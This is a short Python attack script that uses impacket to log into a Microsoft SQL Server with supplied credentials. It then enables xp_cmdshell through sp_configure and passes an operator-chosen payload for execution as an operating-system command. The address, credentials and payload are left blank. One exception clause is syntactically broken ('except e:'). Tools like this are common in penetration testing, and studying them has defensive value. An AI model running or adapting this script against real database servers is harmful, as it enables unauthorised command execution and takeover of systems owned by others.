import logging

from impacket import version, tds

class SQLClient():
    def __init__(self):
        self.sql = None

    def login(self, addr, port, user, pwd):
        self.sql = tds.MSSQL(addr, int(port))
        self.sql.connect()
        try:
            # login(self, database, username, password='', domain='',
            #           hashes = None, useWindowsAuth = False)
            self.sql.login(None, user, pwd, '', None, False)
        except e:
            logging.debug("Exception:", exc_info=True)
            logging.error(str(e))

    def xp_cmdshell(self):
        try:
            self.sql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;"
                               "exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
            self.sql.printReplies()
            self.sql.printRows()
        except:
            pass

    def execute(self, payload):
        try:
            self.sql.sql_query(f"EXEC xp_cmdshell '{payload}';")
            self.sql.printReplies()
            self.sql.printRows()
        except:
            pass


# User options
addr = ""
port = 1433
user = ""
pwd  = ""

# payload to be executed in a cmd shell
payload = ""

print("[*] Attempting to connect to database")
sql_client = SQLClient()
sql_client.login(addr, port, user, pwd)

print("[*] Enabling xp_cmdshell commands")
sql_client.xp_cmdshell()

print("[*] Passing payload to xp_cmdshell")
sql_client.execute(payload)
